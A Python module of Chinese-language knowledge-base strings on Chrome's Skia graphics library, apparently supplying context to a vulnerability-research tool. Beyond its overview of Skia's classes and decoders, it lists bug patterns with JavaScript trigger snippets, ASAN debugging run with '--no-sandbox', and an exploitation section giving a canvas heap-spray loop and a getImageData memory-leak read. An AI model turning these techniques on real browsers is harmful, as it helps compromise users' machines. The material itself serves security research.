"""
Skia Graphics Library Knowledge Base

Skia is Chrome's 2D graphics library used for rendering.
"""

SKIA_OVERVIEW = """
# Skia Graphics Library Overview

Skia是Chrome的2D图形渲染库，处理所有绑定到屏幕的绘制操作。

## 核心功能
1. **路径渲染**: 矢量图形、贝塞尔曲线
2. **图像处理**: 解码、编码、滤镜
3. **文本渲染**: 字体光栅化、文本布局
4. **GPU加速**: OpenGL/Vulkan/Metal后端

## 关键目录
- `third_party/skia/src/core/`: 核心渲染逻辑
- `third_party/skia/src/gpu/`: GPU后端
- `third_party/skia/src/codec/`: 图像编解码
- `third_party/skia/src/effects/`: 图像效果

## 主要类
- **SkCanvas**: 绑定目标，接收所有绘制调用
- **SkPaint**: 绘制样式（颜色、描边、滤镜）
- **SkPath**: 矢量路径
- **SkImage/SkBitmap**: 位图图像
- **SkShader**: 着色器（渐变、图案）
"""

SKIA_IMAGE_DECODING = """
# Skia 图像解码

## 支持的格式
- PNG, JPEG, WebP, GIF, BMP, ICO, WBMP
- HEIF (部分平台)
- RAW formats

## 解码流程
```
输入数据 → SkCodec → SkBitmap/SkImage
```

## 关键类
- **SkCodec**: 基础解码器接口
- **SkPngCodec**: PNG解码
- **SkJpegCodec**: JPEG解码
- **SkWebpCodec**: WebP解码

## 常见漏洞位置
1. **头部解析**: 图像尺寸、颜色空间
2. **像素解码**: 压缩数据解压
3. **ICC配置文件**: 颜色管理
4. **动画帧**: GIF/WebP动画处理
"""

SKIA_VULNERABILITY_PATTERNS = """
# Skia 常见漏洞模式

## 1. 整数溢出

### 模式
- 图像尺寸计算溢出
- 缓冲区大小计算错误
- 像素数量乘法溢出

### 触发示例
```html
<!-- 超大尺寸图像 -->
<img src="data:image/png;base64,..." />
```

```javascript
// 通过Canvas API触发
let canvas = document.createElement('canvas');
canvas.width = 0x7FFFFFFF;  // 大尺寸
canvas.height = 0x7FFFFFFF;
let ctx = canvas.getContext('2d');
ctx.drawImage(img, 0, 0);
```

## 2. 堆缓冲区溢出

### 模式
- 畸形图像数据导致越界写入
- 调色板索引越界
- 压缩数据解码越界

### 触发示例
```javascript
// 加载畸形图像
let img = new Image();
img.src = 'malformed.png';  // 畸形PNG
img.onload = () => {
    ctx.drawImage(img, 0, 0);
};
```

## 3. 路径渲染漏洞

### 模式
- 极端路径数据（无穷大、NaN）
- 路径操作导致的内存问题
- 贝塞尔曲线计算错误

### 触发示例
```javascript
let canvas = document.createElement('canvas');
let ctx = canvas.getContext('2d');

// 极端路径值
ctx.beginPath();
ctx.moveTo(Infinity, NaN);
ctx.bezierCurveTo(1e308, -1e308, 0, 0, 1, 1);
ctx.stroke();
```

## 4. SVG/路径解析漏洞

### 模式
- 畸形SVG路径数据
- 路径命令解析错误
- 递归/嵌套过深

### 触发示例
```html
<svg>
    <path d="M0,0 L999999999999,0 ..." />
</svg>
```

## 5. 滤镜/效果漏洞

### 模式
- 模糊滤镜参数溢出
- 颜色矩阵计算错误
- 着色器编译问题

### 触发示例
```javascript
ctx.filter = 'blur(999999px)';
ctx.drawImage(img, 0, 0);
```
"""

SKIA_DEBUGGING = """
# Skia 调试技术

## 调试标志
```bash
# 启用Skia调试日志
--enable-skia-benchmarking
--enable-gpu-debugging
```

## 关键源文件
- `src/codec/SkCodec.cpp`: 解码器入口
- `src/core/SkPath.cpp`: 路径操作
- `src/core/SkCanvas.cpp`: 画布操作
- `src/gpu/GrContext.cpp`: GPU上下文

## ASAN检测
```bash
# 运行ASAN构建
./chrome --no-sandbox malicious.html
# 检查heap-buffer-overflow等错误
```

## 复现图像漏洞
```javascript
// 方法1: img标签
let img = new Image();
img.src = 'poc.png';

// 方法2: Canvas
let img = new Image();
img.onload = () => {
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d');
    ctx.drawImage(img, 0, 0);
};
img.src = 'poc.png';

// 方法3: createImageBitmap
fetch('poc.png')
    .then(r => r.blob())
    .then(b => createImageBitmap(b));
```
"""

SKIA_EXPLOITATION = """
# Skia 利用技术

## 堆喷射
```javascript
// 通过ImageData喷射
let spray = [];
for (let i = 0; i < 1000; i++) {
    let canvas = document.createElement('canvas');
    canvas.width = canvas.height = 256;
    let ctx = canvas.getContext('2d');
    let data = ctx.createImageData(256, 256);
    // 填充可控数据
    for (let j = 0; j < data.data.length; j += 4) {
        data.data[j] = 0x41;     // R
        data.data[j+1] = 0x41;   // G
        data.data[j+2] = 0x41;   // B
        data.data[j+3] = 0x41;   // A
    }
    ctx.putImageData(data, 0, 0);
    spray.push(canvas);
}
```

## 信息泄露
```javascript
// 通过Canvas读取像素
let canvas = document.createElement('canvas');
let ctx = canvas.getContext('2d');
ctx.drawImage(corruptedImage, 0, 0);
let data = ctx.getImageData(0, 0, 100, 100);
// data.data 可能包含泄露的内存
```

## 常见利用目标
1. **ArrayBuffer**: 图像数据缓冲区
2. **SkBitmap**: 位图对象
3. **GPU内存**: WebGL纹理
"""


def get_skia_knowledge() -> str:
    """获取完整的Skia知识库"""
    return "\n\n".join([
        SKIA_OVERVIEW,
        SKIA_IMAGE_DECODING,
        SKIA_VULNERABILITY_PATTERNS,
        SKIA_DEBUGGING,
    ])


SKIA_KNOWLEDGE_SECTIONS = {
    "overview": SKIA_OVERVIEW,
    "image_decoding": SKIA_IMAGE_DECODING,
    "patterns": SKIA_VULNERABILITY_PATTERNS,
    "debugging": SKIA_DEBUGGING,
    "exploitation": SKIA_EXPLOITATION,
}
